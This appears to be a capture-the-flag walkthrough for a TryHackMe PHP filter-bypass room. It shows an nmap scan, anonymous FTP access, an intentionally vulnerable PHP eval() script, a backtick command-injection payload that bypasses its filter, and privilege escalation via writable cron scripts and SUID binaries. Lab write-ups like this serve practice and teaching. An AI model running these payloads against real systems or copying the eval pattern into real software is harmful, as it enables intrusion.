## Room  is backtikcs on tryhackme

The room will let you practise php fileter bypass

Big hint starts from nmap stage
 
    sudo nmap -sVC <ip> -Pn -vv
 
 The output of it we will see that we have anonymous access to ftp server on `port 21`
 
    ftp <ip>
    
    username: anonymous
    passsword: anything
then you will find a directory called pub in which inside it has a dockfile which you cam download it through

    get manifest.docs
    
Then navigate to the directory you downloaded and open it to read what is inside. 
It is nothing but a was to use backticks tricks to bypass php filters

PHP source codes

      <?php
        //only the server can reveal the flag on http://google.com
        //?x=red: {{print(`whoami`)}}
        ///{${ print_r(`whoami`) }}
        // /dev/ctf

        function x($string)
        {
                $x = preg_match_all('/([a-z0-9_]+)\s*\(/isU', $string, $matches);
                if ($x) {
                        //$func = $matches[1][0];
                        foreach ($matches[1] as $func) {
                                //echo $func;
                                if (function_exists($func)) {
                                        echo "Don't Hack me with: " . $x;
                                        exit;
                                }
                        }

                        //exit;
                }
                //$r = str_replace('/dev/ctf', '\\"xxdd33\\"', $string);
                // BACKUP -->   $r = preg_replace('/(red|green|white|black|blue):\s*(.*)/', 'echo \'<div style="color:$1;">\'.strtolower(mambo vip"$2").\'</div>\';', $string);
                $r = preg_replace('/(red):\s*(.*)/', 'echo \'<div style="color:$1; font-size:25px">\'.strtolower("$2").\'</div>\';', $string);
                //echo $r;
                return eval($r);
        }

        if (isset($_POST['stp'])) {
                x($_POST['stp']);
                exit;
        }

        ?>
        
  so every thing suspicious is terminated. So using backticks you completely bypass it
     eg.
     
            ${print `ls`}
 so you can use any payload to get a reverse shell as web user.
 
 ### prevelege escation
 
 
   * look at crontabs you may find editable to everybody scripts and it is run as user john so you cat get the userjohn shell now
   * To be root just find suid binaries and read any file using the privilege of find command
 
             find / -perm -u=s -type f 2>/dev/null
             
   
